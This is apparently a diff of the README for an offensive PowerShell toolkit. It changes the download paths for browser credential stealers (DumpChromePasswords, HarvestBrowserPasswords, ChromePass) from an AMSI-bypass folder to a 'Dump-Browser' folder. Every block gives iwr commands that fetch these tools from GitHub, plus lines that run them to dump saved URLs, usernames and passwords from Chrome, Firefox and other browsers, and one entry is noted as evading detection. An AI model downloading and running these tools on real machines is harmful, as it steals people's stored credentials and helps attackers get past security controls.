@@ -6,8 +6,8 @@
 |DumpChromePasswords|dumps URLs, usernames, and passwords from Chrome.|User Land|Only dumps chrome browser|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/DumpChromePasswords.ps1" -OutFile "DumpChromePasswords.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip" -OutFile "sqlite-netFx40-static-binary-bundle-x64-2010-1.0.113.0.zip"
 ```
 
 **prerequisites:**
@@ -32,7 +32,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 |HarvestBrowserPasswords|dumps URLs, usernames, and passwords from major browsers.|User Land|Dumps major browsers|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
 ```
 
 ```powershell
@@ -52,11 +52,9 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 |ChromePass|dumps URLs, usernames, and passwords from chrome browser.|Administrator|ChromePass.ps1 downloads\evade detection|
 
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1" -OutFile "ChromePass.ps1"
 ```
 
 ```powershell
-.\HarvestBrowserPasswords.exe -a, --all
-.\HarvestBrowserPasswords.exe -f, --firefox
-.\HarvestBrowserPasswords.exe -c, --chrome
+.\ChromePass.ps1
 ```
